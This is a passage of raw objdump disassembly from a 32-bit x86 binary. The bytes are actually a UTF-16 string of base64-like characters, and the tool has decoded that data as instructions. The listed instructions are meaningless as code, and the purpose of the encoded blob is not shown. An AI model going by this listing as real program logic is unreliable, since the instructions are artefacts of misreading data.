  40a355:	00 6b 00             	add    %ch,0x0(%ebx)
  40a358:	6d                   	insl   (%dx),%es:(%edi)
  40a359:	00 49 00             	add    %cl,0x0(%ecx)
  40a35c:	4a                   	dec    %edx
  40a35d:	00 32                	add    %dh,(%edx)
  40a35f:	00 79 00             	add    %bh,0x0(%ecx)
  40a362:	6f                   	outsl  %ds:(%esi),(%dx)
  40a363:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
  40a367:	00 75 00             	add    %dh,0x0(%ebp)
  40a36a:	32 00                	xor    (%eax),%al
  40a36c:	50                   	push   %eax
  40a36d:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40a371:	00 51 00             	add    %dl,0x0(%ecx)
  40a374:	49                   	dec    %ecx
  40a375:	00 4f 00             	add    %cl,0x0(%edi)
  40a378:	39 00                	cmp    %eax,(%eax)
  40a37a:	4e                   	dec    %esi
  40a37b:	00 47 00             	add    %al,0x0(%edi)
  40a37e:	77 00                	ja     0x40a380
  40a380:	4e                   	dec    %esi
  40a381:	00 66 00             	add    %ah,0x0(%esi)
  40a384:	51                   	push   %ecx
  40a385:	00 66 00             	add    %ah,0x0(%esi)
  40a388:	4d                   	dec    %ebp
  40a389:	00 64 00 59          	add    %ah,0x59(%eax,%eax,1)
  40a38d:	00 39                	add    %bh,(%ecx)
  40a38f:	00 4c 00 6c          	add    %cl,0x6c(%eax,%eax,1)
  40a393:	00 77 00             	add    %dh,0x0(%edi)
  40a396:	62 00                	bound  %eax,(%eax)
  40a398:	42                   	inc    %edx
  40a399:	00 6f 00             	add    %ch,0x0(%edi)
  40a39c:	74 00                	je     0x40a39e
  40a39e:	33 00                	xor    (%eax),%eax
  40a3a0:	65 00 30             	add    %dh,%gs:(%eax)
  40a3a3:	00 6b 00             	add    %ch,0x0(%ebx)
  40a3a6:	2b 00                	sub    (%eax),%eax
  40a3a8:	2b 00                	sub    (%eax),%eax
  40a3aa:	50                   	push   %eax
  40a3ab:	00 6d 00             	add    %ch,0x0(%ebp)
  40a3ae:	4b                   	dec    %ebx
  40a3af:	00 6a 00             	add    %ch,0x0(%edx)
  40a3b2:	31 00                	xor    %eax,(%eax)
  40a3b4:	72 00                	jb     0x40a3b6
  40a3b6:	6c                   	insb   (%dx),%es:(%edi)
  40a3b7:	00 31                	add    %dh,(%ecx)
  40a3b9:	00 6c 00 33          	add    %ch,0x33(%eax,%eax,1)
  40a3bd:	00 37                	add    %dh,(%edi)
  40a3bf:	00 31                	add    %dh,(%ecx)
  40a3c1:	00 32                	add    %dh,(%edx)
  40a3c3:	00 7a 00             	add    %bh,0x0(%edx)
  40a3c6:	50                   	push   %eax
  40a3c7:	00 35 00 62 00 64    	add    %dh,0x64006200
  40a3cd:	00 7a 00             	add    %bh,0x0(%edx)
  40a3d0:	32 00                	xor    (%eax),%al
  40a3d2:	38 00                	cmp    %al,(%eax)
  40a3d4:	42                   	inc    %edx
  40a3d5:	00 48 00             	add    %cl,0x0(%eax)
  40a3d8:	43                   	inc    %ebx
  40a3d9:	00 2f                	add    %ch,(%edi)
  40a3db:	00 49 00             	add    %cl,0x0(%ecx)
  40a3de:	4b                   	dec    %ebx
  40a3df:	00 61 00             	add    %ah,0x0(%ecx)
  40a3e2:	33 00                	xor    (%eax),%eax
  40a3e4:	48                   	dec    %eax
  40a3e5:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  40a3e9:	00 31                	add    %dh,(%ecx)
  40a3eb:	00 73 00             	add    %dh,0x0(%ebx)
  40a3ee:	6b 00 56             	imul   $0x56,(%eax),%eax
  40a3f1:	00 63 00             	add    %ah,0x0(%ebx)
  40a3f4:	4f                   	dec    %edi
  40a3f5:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  40a3f9:	00 77 00             	add    %dh,0x0(%edi)
  40a3fc:	38 00                	cmp    %al,(%eax)
  40a3fe:	30 00                	xor    %al,(%eax)
  40a400:	76 00                	jbe    0x40a402
  40a402:	61                   	popa
  40a403:	00 66 00             	add    %ah,0x0(%esi)
  40a406:	46                   	inc    %esi
  40a407:	00 30                	add    %dh,(%eax)
  40a409:	00 30                	add    %dh,(%eax)
  40a40b:	00 4a 00             	add    %cl,0x0(%edx)
  40a40e:	55                   	push   %ebp
  40a40f:	00 79 00             	add    %bh,0x0(%ecx)
  40a412:	62 00                	bound  %eax,(%eax)
  40a414:	68 00 32 00 49       	push   $0x49003200
  40a419:	00 61 00             	add    %ah,0x0(%ecx)
  40a41c:	39 00                	cmp    %eax,(%eax)
  40a41e:	62 00                	bound  %eax,(%eax)
  40a420:	51                   	push   %ecx
  40a421:	00 75 00             	add    %dh,0x0(%ebp)
  40a424:	6f                   	outsl  %ds:(%esi),(%dx)
  40a425:	00 61 00             	add    %ah,0x0(%ecx)
  40a428:	6f                   	outsl  %ds:(%esi),(%dx)
  40a429:	00 49 00             	add    %cl,0x0(%ecx)
  40a42c:	38 00                	cmp    %al,(%eax)
  40a42e:	41                   	inc    %ecx
  40a42f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a432:	49                   	dec    %ecx
  40a433:	00 4b 00             	add    %cl,0x0(%ebx)
  40a436:	69 00 35 00 6d 00    	imul   $0x6d0035,(%eax),%eax
  40a43c:	51                   	push   %ecx
  40a43d:	00 42 00             	add    %al,0x0(%edx)
  40a440:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40a444:	48                   	dec    %eax
  40a445:	00 65 00             	add    %ah,0x0(%ebp)
  40a448:	39 00                	cmp    %eax,(%eax)
  40a44a:	63 00                	arpl   %eax,(%eax)
  40a44c:	59                   	pop    %ecx
  40a44d:	00 52 00             	add    %dl,0x0(%edx)
  40a450:	56                   	push   %esi
  40a451:	00 57 00             	add    %dl,0x0(%edi)
  40a454:	48                   	dec    %eax
  40a455:	00 76 00             	add    %dh,0x0(%esi)
  40a458:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40a45c:	2b 00                	sub    (%eax),%eax
  40a45e:	31 00                	xor    %eax,(%eax)
  40a460:	39 00                	cmp    %eax,(%eax)
  40a462:	33 00                	xor    (%eax),%eax
  40a464:	72 00                	jb     0x40a466
  40a466:	77 00                	ja     0x40a468
  40a468:	76 00                	jbe    0x40a46a
  40a46a:	30 00                	xor    %al,(%eax)
  40a46c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a46d:	00 43 00             	add    %al,0x0(%ebx)
  40a470:	61                   	popa
  40a471:	00 66 00             	add    %ah,0x0(%esi)
  40a474:	35 00 74 00 4a       	xor    $0x4a007400,%eax
  40a479:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
  40a47d:	00 49 00             	add    %cl,0x0(%ecx)
  40a480:	55                   	push   %ebp
  40a481:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40a485:	00 4c 00 4a          	add    %cl,0x4a(%eax,%eax,1)
  40a489:	00 4f 00             	add    %cl,0x0(%edi)
  40a48c:	35 00 77 00 46       	xor    $0x46007700,%eax
  40a491:	00 4e 00             	add    %cl,0x0(%esi)
  40a494:	49                   	dec    %ecx
  40a495:	00 4b 00             	add    %cl,0x0(%ebx)
  40a498:	51                   	push   %ecx
  40a499:	00 4a 00             	add    %cl,0x0(%edx)
  40a49c:	64 00 2b             	add    %ch,%fs:(%ebx)
  40a49f:	00 46 00             	add    %al,0x0(%esi)
  40a4a2:	32 00                	xor    (%eax),%al
  40a4a4:	41                   	inc    %ecx
  40a4a5:	00 46 00             	add    %al,0x0(%esi)
  40a4a8:	70 00                	jo     0x40a4aa
  40a4aa:	72 00                	jb     0x40a4ac
  40a4ac:	74 00                	je     0x40a4ae
  40a4ae:	39 00                	cmp    %eax,(%eax)
  40a4b0:	49                   	dec    %ecx
  40a4b1:	00 4f 00             	add    %cl,0x0(%edi)
  40a4b4:	6b 00 66             	imul   $0x66,(%eax),%eax
  40a4b7:	00 63 00             	add    %ah,0x0(%ebx)
  40a4ba:	52                   	push   %edx
  40a4bb:	00 5a 00             	add    %bl,0x0(%edx)
  40a4be:	42                   	inc    %edx
  40a4bf:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40a4c3:	00 42 00             	add    %al,0x0(%edx)
  40a4c6:	33 00                	xor    (%eax),%eax
  40a4c8:	74 00                	je     0x40a4ca
  40a4ca:	39 00                	cmp    %eax,(%eax)
  40a4cc:	76 00                	jbe    0x40a4ce
  40a4ce:	4c                   	dec    %esp
  40a4cf:	00 38                	add    %bh,(%eax)
  40a4d1:	00 59 00             	add    %bl,0x0(%ecx)
  40a4d4:	33 00                	xor    (%eax),%eax
  40a4d6:	42                   	inc    %edx
  40a4d7:	00 58 00             	add    %bl,0x0(%eax)
  40a4da:	4f                   	dec    %edi
  40a4db:	00 35 00 66 00 43    	add    %dh,0x43006600
  40a4e1:	00 79 00             	add    %bh,0x0(%ecx)
  40a4e4:	69 00 35 00 51 00    	imul   $0x510035,(%eax),%eax
  40a4ea:	52                   	push   %edx
  40a4eb:	00 33                	add    %dh,(%ebx)
  40a4ed:	00 36                	add    %dh,(%esi)
  40a4ef:	00 4f 00             	add    %cl,0x0(%edi)
  40a4f2:	4f                   	dec    %edi
  40a4f3:	00 69 00             	add    %ch,0x0(%ecx)
  40a4f6:	43                   	inc    %ebx
  40a4f7:	00 4e 00             	add    %cl,0x0(%esi)
  40a4fa:	4b                   	dec    %ebx
  40a4fb:	00 32                	add    %dh,(%edx)
  40a4fd:	00 4e 00             	add    %cl,0x0(%esi)
  40a500:	4b                   	dec    %ebx
  40a501:	00 56 00             	add    %dl,0x0(%esi)
  40a504:	4c                   	dec    %esp
  40a505:	00 33                	add    %dh,(%ebx)
  40a507:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  40a50b:	00 73 00             	add    %dh,0x0(%ebx)
  40a50e:	55                   	push   %ebp
  40a50f:	00 77 00             	add    %dh,0x0(%edi)
  40a512:	4c                   	dec    %esp
  40a513:	00 61 00             	add    %ah,0x0(%ecx)
  40a516:	4b                   	dec    %ebx
  40a517:	00 76 00             	add    %dh,0x0(%esi)
  40a51a:	2b 00                	sub    (%eax),%eax
  40a51c:	32 00                	xor    (%eax),%al
  40a51e:	6c                   	insb   (%dx),%es:(%edi)
  40a51f:	00 6f 00             	add    %ch,0x0(%edi)
  40a522:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a526:	63 00                	arpl   %eax,(%eax)
  40a528:	4f                   	dec    %edi
  40a529:	00 66 00             	add    %ah,0x0(%esi)
  40a52c:	70 00                	jo     0x40a52e
  40a52e:	36 00 32             	add    %dh,%ss:(%edx)
  40a531:	00 2f                	add    %ch,(%edi)
  40a533:	00 69 00             	add    %ch,0x0(%ecx)
  40a536:	55                   	push   %ebp
  40a537:	00 6d 00             	add    %ch,0x0(%ebp)
  40a53a:	75 00                	jne    0x40a53c
  40a53c:	72 00                	jb     0x40a53e
  40a53e:	65 00 30             	add    %dh,%gs:(%eax)
  40a541:	00 38                	add    %bh,(%eax)
  40a543:	00 38                	add    %bh,(%eax)
  40a545:	00 2b                	add    %ch,(%ebx)
  40a547:	00 69 00             	add    %ch,0x0(%ecx)
  40a54a:	46                   	inc    %esi
  40a54b:	00 57 00             	add    %dl,0x0(%edi)
  40a54e:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40a552:	52                   	push   %edx
  40a553:	00 77 00             	add    %dh,0x0(%edi)
  40a556:	6e                   	outsb  %ds:(%esi),(%dx)
  40a557:	00 43 00             	add    %al,0x0(%ebx)
  40a55a:	67 00 77 00          	add    %dh,0x0(%bx)
  40a55e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a55f:	00 67 00             	add    %ah,0x0(%edi)
  40a562:	61                   	popa
  40a563:	00 63 00             	add    %ah,0x0(%ebx)
  40a566:	70 00                	jo     0x40a568
  40a568:	5a                   	pop    %edx
  40a569:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40a56d:	00 58 00             	add    %bl,0x0(%eax)
  40a570:	32 00                	xor    (%eax),%al
  40a572:	76 00                	jbe    0x40a574
  40a574:	63 00                	arpl   %eax,(%eax)
  40a576:	57                   	push   %edi
  40a577:	00 72 00             	add    %dh,0x0(%edx)
  40a57a:	53                   	push   %ebx
  40a57b:	00 4e 00             	add    %cl,0x0(%esi)
  40a57e:	2f                   	das
  40a57f:	00 51 00             	add    %dl,0x0(%ecx)
  40a582:	70 00                	jo     0x40a584
  40a584:	37                   	aaa
  40a585:	00 5a 00             	add    %bl,0x0(%edx)
  40a588:	30 00                	xor    %al,(%eax)
  40a58a:	2f                   	das
  40a58b:	00 56 00             	add    %dl,0x0(%esi)
  40a58e:	54                   	push   %esp
  40a58f:	00 50 00             	add    %dl,0x0(%eax)
  40a592:	76 00                	jbe    0x40a594
  40a594:	31 00                	xor    %eax,(%eax)
  40a596:	61                   	popa
  40a597:	00 55 00             	add    %dl,0x0(%ebp)
  40a59a:	49                   	dec    %ecx
  40a59b:	00 75 00             	add    %dh,0x0(%ebp)
  40a59e:	45                   	inc    %ebp
  40a59f:	00 2f                	add    %ch,(%edi)
  40a5a1:	00 77 00             	add    %dh,0x0(%edi)
  40a5a4:	2b 00                	sub    (%eax),%eax
  40a5a6:	39 00                	cmp    %eax,(%eax)
  40a5a8:	41                   	inc    %ecx
  40a5a9:	00 30                	add    %dh,(%eax)
  40a5ab:	00 45 00             	add    %al,0x0(%ebp)
  40a5ae:	67 00 45 00          	add    %al,0x0(%di)
  40a5b2:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40a5b6:	50                   	push   %eax
  40a5b7:	00 77 00             	add    %dh,0x0(%edi)
  40a5ba:	31 00                	xor    %eax,(%eax)
  40a5bc:	5a                   	pop    %edx
  40a5bd:	00 31                	add    %dh,(%ecx)
  40a5bf:	00 45 00             	add    %al,0x0(%ebp)
  40a5c2:	52                   	push   %edx
  40a5c3:	00 50 00             	add    %dl,0x0(%eax)
  40a5c6:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40a5ca:	42                   	inc    %edx
  40a5cb:	00 6b 00             	add    %ch,0x0(%ebx)
  40a5ce:	51                   	push   %ecx
  40a5cf:	00 7a 00             	add    %bh,0x0(%edx)
  40a5d2:	66 00 58 00          	data16 add %bl,0x0(%eax)
  40a5d6:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40a5da:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5db:	00 42 00             	add    %al,0x0(%edx)
  40a5de:	70 00                	jo     0x40a5e0
  40a5e0:	4e                   	dec    %esi
  40a5e1:	00 52 00             	add    %dl,0x0(%edx)
  40a5e4:	35 00 78 00 49       	xor    $0x49007800,%eax
  40a5e9:	00 54 00 70          	add    %dl,0x70(%eax,%eax,1)
  40a5ed:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5f0:	54                   	push   %esp
  40a5f1:	00 53 00             	add    %dl,0x0(%ebx)
  40a5f4:	6b 00 43             	imul   $0x43,(%eax),%eax
  40a5f7:	00 46 00             	add    %al,0x0(%esi)
  40a5fa:	70 00                	jo     0x40a5fc
  40a5fc:	49                   	dec    %ecx
  40a5fd:	00 78 00             	add    %bh,0x0(%eax)
  40a600:	36 00 35 00 38 00 6f 	add    %dh,%ss:0x6f003800
  40a607:	00 57 00             	add    %dl,0x0(%edi)
  40a60a:	4a                   	dec    %edx
  40a60b:	00 43 00             	add    %al,0x0(%ebx)
  40a60e:	33 00                	xor    (%eax),%eax
  40a610:	48                   	dec    %eax
  40a611:	00 37                	add    %dh,(%edi)
  40a613:	00 48 00             	add    %cl,0x0(%eax)
  40a616:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a61a:	6a 00                	push   $0x0
  40a61c:	62 00                	bound  %eax,(%eax)
  40a61e:	69 00 6d 00 4f 00    	imul   $0x4f006d,(%eax),%eax
  40a624:	2b 00                	sub    (%eax),%eax
  40a626:	32 00                	xor    (%eax),%al
  40a628:	2b 00                	sub    (%eax),%eax
  40a62a:	62 00                	bound  %eax,(%eax)
  40a62c:	37                   	aaa
  40a62d:	00 36                	add    %dh,(%esi)
  40a62f:	00 75 00             	add    %dh,0x0(%ebp)
  40a632:	67 00 37             	add    %dh,(%bx)
  40a635:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  40a639:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  40a63d:	00 77 00             	add    %dh,0x0(%edi)
  40a640:	41                   	inc    %ecx
  40a641:	00 31                	add    %dh,(%ecx)
  40a643:	00 70 00             	add    %dh,0x0(%eax)
  40a646:	4e                   	dec    %esi
  40a647:	00 73 00             	add    %dh,0x0(%ebx)
  40a64a:	61                   	popa
  40a64b:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40a64f:	00 41 00             	add    %al,0x0(%ecx)
  40a652:	75 00                	jne    0x40a654
  40a654:	44                   	inc    %esp
  40a655:	00 59 00             	add    %bl,0x0(%ecx)
  40a658:	4c                   	dec    %esp
  40a659:	00 76 00             	add    %dh,0x0(%esi)
  40a65c:	33 00                	xor    (%eax),%eax
  40a65e:	62 00                	bound  %eax,(%eax)
  40a660:	54                   	push   %esp
  40a661:	00 57 00             	add    %dl,0x0(%edi)
  40a664:	55                   	push   %ebp
  40a665:	00 6f 00             	add    %ch,0x0(%edi)
  40a668:	46                   	inc    %esi
  40a669:	00 46 00             	add    %al,0x0(%esi)
  40a66c:	7a 00                	jp     0x40a66e
  40a66e:	7a 00                	jp     0x40a670
  40a670:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40a674:	61                   	popa
  40a675:	00 38                	add    %bh,(%eax)
  40a677:	00 63 00             	add    %ah,0x0(%ebx)
  40a67a:	2b 00                	sub    (%eax),%eax
  40a67c:	31 00                	xor    %eax,(%eax)
  40a67e:	62 00                	bound  %eax,(%eax)
  40a680:	52                   	push   %edx
  40a681:	00 31                	add    %dh,(%ecx)
  40a683:	00 72 00             	add    %dh,0x0(%edx)
  40a686:	68 00 56 00 61       	push   $0x61005600
  40a68b:	00 77 00             	add    %dh,0x0(%edi)
  40a68e:	76 00                	jbe    0x40a690
  40a690:	72 00                	jb     0x40a692
  40a692:	6d                   	insl   (%dx),%es:(%edi)
  40a693:	00 4e 00             	add    %cl,0x0(%esi)
  40a696:	50                   	push   %eax
  40a697:	00 51 00             	add    %dl,0x0(%ecx)
  40a69a:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40a69e:	45                   	inc    %ebp
  40a69f:	00 62 00             	add    %ah,0x0(%edx)
  40a6a2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6a3:	00 79 00             	add    %bh,0x0(%ecx)
  40a6a6:	6a 00                	push   $0x0
  40a6a8:	52                   	push   %edx
  40a6a9:	00 2b                	add    %ch,(%ebx)
  40a6ab:	00 65 00             	add    %ah,0x0(%ebp)
  40a6ae:	34 00                	xor    $0x0,%al
  40a6b0:	32 00                	xor    (%eax),%al
  40a6b2:	61                   	popa
  40a6b3:	00 75 00             	add    %dh,0x0(%ebp)
  40a6b6:	52                   	push   %edx
  40a6b7:	00 58 00             	add    %bl,0x0(%eax)
  40a6ba:	53                   	push   %ebx
  40a6bb:	00 79 00             	add    %bh,0x0(%ecx)
  40a6be:	73 00                	jae    0x40a6c0
  40a6c0:	67 00 4d 00          	add    %cl,0x0(%di)
  40a6c4:	51                   	push   %ecx
  40a6c5:	00 46 00             	add    %al,0x0(%esi)
  40a6c8:	44                   	inc    %esp
  40a6c9:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40a6cd:	00 59 00             	add    %bl,0x0(%ecx)
  40a6d0:	39 00                	cmp    %eax,(%eax)
  40a6d2:	5a                   	pop    %edx
  40a6d3:	00 33                	add    %dh,(%ebx)
  40a6d5:	00 68 00             	add    %ch,0x0(%eax)
  40a6d8:	48                   	dec    %eax
  40a6d9:	00 6d 00             	add    %ch,0x0(%ebp)
  40a6dc:	37                   	aaa
  40a6dd:	00 5a 00             	add    %bl,0x0(%edx)
  40a6e0:	59                   	pop    %ecx
  40a6e1:	00 30                	add    %dh,(%eax)
  40a6e3:	00 42 00             	add    %al,0x0(%edx)
  40a6e6:	6a 00                	push   $0x0
  40a6e8:	61                   	popa
  40a6e9:	00 2f                	add    %ch,(%edi)
  40a6eb:	00 41 00             	add    %al,0x0(%ecx)
  40a6ee:	33 00                	xor    (%eax),%eax
  40a6f0:	51                   	push   %ecx
  40a6f1:	00 72 00             	add    %dh,0x0(%edx)
  40a6f4:	6d                   	insl   (%dx),%es:(%edi)
  40a6f5:	00 48 00             	add    %cl,0x0(%eax)
  40a6f8:	50                   	push   %eax
  40a6f9:	00 4f 00             	add    %cl,0x0(%edi)
  40a6fc:	2b 00                	sub    (%eax),%eax
  40a6fe:	75 00                	jne    0x40a700
  40a700:	6f                   	outsl  %ds:(%esi),(%dx)
  40a701:	00 77 00             	add    %dh,0x0(%edi)
  40a704:	4e                   	dec    %esi
  40a705:	00 66 00             	add    %ah,0x0(%esi)
  40a708:	78 00                	js     0x40a70a
  40a70a:	46                   	inc    %esi
  40a70b:	00 4c 00 6d          	add    %cl,0x6d(%eax,%eax,1)
  40a70f:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  40a713:	00 42 00             	add    %al,0x0(%edx)
  40a716:	32 00                	xor    (%eax),%al
  40a718:	30 00                	xor    %al,(%eax)
  40a71a:	4b                   	dec    %ebx
  40a71b:	00 38                	add    %bh,(%eax)
  40a71d:	00 45 00             	add    %al,0x0(%ebp)
  40a720:	66 00 32             	data16 add %dh,(%edx)
  40a723:	00 6d 00             	add    %ch,0x0(%ebp)
  40a726:	44                   	inc    %esp
  40a727:	00 4a 00             	add    %cl,0x0(%edx)
  40a72a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a72b:	00 46 00             	add    %al,0x0(%esi)
  40a72e:	70 00                	jo     0x40a730
  40a730:	66 00 33             	data16 add %dh,(%ebx)
  40a733:	00 6e 00             	add    %ch,0x0(%esi)
  40a736:	58                   	pop    %eax
  40a737:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  40a73b:	00 46 00             	add    %al,0x0(%esi)
  40a73e:	56                   	push   %esi
  40a73f:	00 72 00             	add    %dh,0x0(%edx)
  40a742:	6f                   	outsl  %ds:(%esi),(%dx)
  40a743:	00 41 00             	add    %al,0x0(%ecx)
  40a746:	78 00                	js     0x40a748
  40a748:	54                   	push   %esp
  40a749:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a74c:	50                   	push   %eax
  40a74d:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
  40a751:	00 78 00             	add    %bh,0x0(%eax)
  40a754:	64 00 2f             	add    %ch,%fs:(%edi)
  40a757:	00 56 00             	add    %dl,0x0(%esi)
  40a75a:	2f                   	das
  40a75b:	00 4c 00 2f          	add    %cl,0x2f(%eax,%eax,1)
  40a75f:	00 4a 00             	add    %cl,0x0(%edx)
  40a762:	4a                   	dec    %edx
  40a763:	00 69 00             	add    %ch,0x0(%ecx)
  40a766:	44                   	inc    %esp
  40a767:	00 35 00 56 00 2b    	add    %dh,0x2b005600
  40a76d:	00 7a 00             	add    %bh,0x0(%edx)
  40a770:	74 00                	je     0x40a772
  40a772:	47                   	inc    %edi
  40a773:	00 45 00             	add    %al,0x0(%ebp)
  40a776:	69 00 46 00 65 00    	imul   $0x650046,(%eax),%eax
  40a77c:	69 00 36 00 46 00    	imul   $0x460036,(%eax),%eax
  40a782:	5a                   	pop    %edx
  40a783:	00 73 00             	add    %dh,0x0(%ebx)
  40a786:	41                   	inc    %ecx
  40a787:	00 55 00             	add    %dl,0x0(%ebp)
  40a78a:	48                   	dec    %eax
  40a78b:	00 57 00             	add    %dl,0x0(%edi)
  40a78e:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a792:	77 00                	ja     0x40a794
  40a794:	50                   	push   %eax
  40a795:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
  40a799:	00 4d 00             	add    %cl,0x0(%ebp)
  40a79c:	53                   	push   %ebx
  40a79d:	00 42 00             	add    %al,0x0(%edx)
  40a7a0:	2b 00                	sub    (%eax),%eax
  40a7a2:	44                   	inc    %esp
  40a7a3:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  40a7a7:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40a7ab:	00 6d 00             	add    %ch,0x0(%ebp)
  40a7ae:	79 00                	jns    0x40a7b0
  40a7b0:	70 00                	jo     0x40a7b2
  40a7b2:	2b 00                	sub    (%eax),%eax
  40a7b4:	6d                   	insl   (%dx),%es:(%edi)
  40a7b5:	00 71 00             	add    %dh,0x0(%ecx)
  40a7b8:	39 00                	cmp    %eax,(%eax)
  40a7ba:	34 00                	xor    $0x0,%al
  40a7bc:	4a                   	dec    %edx
  40a7bd:	00 61 00             	add    %ah,0x0(%ecx)
  40a7c0:	34 00                	xor    $0x0,%al
  40a7c2:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40a7c6:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40a7ca:	48                   	dec    %eax
  40a7cb:	00 46 00             	add    %al,0x0(%esi)
  40a7ce:	47                   	inc    %edi
  40a7cf:	00 67 00             	add    %ah,0x0(%edi)
  40a7d2:	4b                   	dec    %ebx
  40a7d3:	00 6c 00 4c          	add    %ch,0x4c(%eax,%eax,1)
  40a7d7:	00 38                	add    %bh,(%eax)
  40a7d9:	00 2b                	add    %ch,(%ebx)
  40a7db:	00 72 00             	add    %dh,0x0(%edx)
  40a7de:	53                   	push   %ebx
  40a7df:	00 70 00             	add    %dh,0x0(%eax)
  40a7e2:	5a                   	pop    %edx
  40a7e3:	00 76 00             	add    %dh,0x0(%esi)
  40a7e6:	78 00                	js     0x40a7e8
  40a7e8:	71 00                	jno    0x40a7ea
  40a7ea:	50                   	push   %eax
  40a7eb:	00 6a 00             	add    %ch,0x0(%edx)
  40a7ee:	49                   	dec    %ecx
  40a7ef:	00 56 00             	add    %dl,0x0(%esi)
  40a7f2:	68 00 32 00 44       	push   $0x44003200
  40a7f7:	00 61 00             	add    %ah,0x0(%ecx)
  40a7fa:	4e                   	dec    %esi
  40a7fb:	00 42 00             	add    %al,0x0(%edx)
  40a7fe:	34 00                	xor    $0x0,%al
  40a800:	54                   	push   %esp
  40a801:	00 55 00             	add    %dl,0x0(%ebp)
  40a804:	55                   	push   %ebp
  40a805:	00 31                	add    %dh,(%ecx)
  40a807:	00 32                	add    %dh,(%edx)
  40a809:	00 79 00             	add    %bh,0x0(%ecx)
  40a80c:	74 00                	je     0x40a80e
  40a80e:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40a812:	55                   	push   %ebp
  40a813:	00 41 00             	add    %al,0x0(%ecx)
  40a816:	49                   	dec    %ecx
  40a817:	00 75 00             	add    %dh,0x0(%ebp)
  40a81a:	4a                   	dec    %edx
  40a81b:	00 2f                	add    %ch,(%edi)
  40a81d:	00 73 00             	add    %dh,0x0(%ebx)
  40a820:	72 00                	jb     0x40a822
  40a822:	70 00                	jo     0x40a824
  40a824:	6e                   	outsb  %ds:(%esi),(%dx)
  40a825:	00 39                	add    %bh,(%ecx)
  40a827:	00 6a 00             	add    %ch,0x0(%edx)
  40a82a:	4c                   	dec    %esp
  40a82b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a82e:	6b 00 36             	imul   $0x36,(%eax),%eax
  40a831:	00 37                	add    %dh,(%edi)
  40a833:	00 76 00             	add    %dh,0x0(%esi)
  40a836:	51                   	push   %ecx
  40a837:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40a83b:	00 58 00             	add    %bl,0x0(%eax)
  40a83e:	72 00                	jb     0x40a840
  40a840:	41                   	inc    %ecx
  40a841:	00 75 00             	add    %dh,0x0(%ebp)
  40a844:	30 00                	xor    %al,(%eax)
  40a846:	61                   	popa
  40a847:	00 45 00             	add    %al,0x0(%ebp)
  40a84a:	79 00                	jns    0x40a84c
  40a84c:	51                   	push   %ecx
  40a84d:	00 33                	add    %dh,(%ebx)
  40a84f:	00 33                	add    %dh,(%ebx)
  40a851:	00 45 00             	add    %al,0x0(%ebp)
  40a854:	39 00                	cmp    %eax,(%eax)
  40a856:	75 00                	jne    0x40a858
  40a858:	53                   	push   %ebx
  40a859:	00 37                	add    %dh,(%edi)
  40a85b:	00 66 00             	add    %ah,0x0(%esi)
  40a85e:	73 00                	jae    0x40a860
  40a860:	63 00                	arpl   %eax,(%eax)
  40a862:	4a                   	dec    %edx
  40a863:	00 46 00             	add    %al,0x0(%esi)
  40a866:	39 00                	cmp    %eax,(%eax)
  40a868:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40a86c:	32 00                	xor    (%eax),%al
  40a86e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a86f:	00 71 00             	add    %dh,0x0(%ecx)
  40a872:	6c                   	insb   (%dx),%es:(%edi)
  40a873:	00 6e 00             	add    %ch,0x0(%esi)
  40a876:	7a 00                	jp     0x40a878
  40a878:	38 00                	cmp    %al,(%eax)
  40a87a:	62 00                	bound  %eax,(%eax)
  40a87c:	63 00                	arpl   %eax,(%eax)
  40a87e:	4a                   	dec    %edx
  40a87f:	00 65 00             	add    %ah,0x0(%ebp)
  40a882:	75 00                	jne    0x40a884
  40a884:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a888:	52                   	push   %edx
  40a889:	00 39                	add    %bh,(%ecx)
  40a88b:	00 66 00             	add    %ah,0x0(%esi)
  40a88e:	31 00                	xor    %eax,(%eax)
  40a890:	4e                   	dec    %esi
  40a891:	00 31                	add    %dh,(%ecx)
  40a893:	00 48 00             	add    %cl,0x0(%eax)
  40a896:	6e                   	outsb  %ds:(%esi),(%dx)
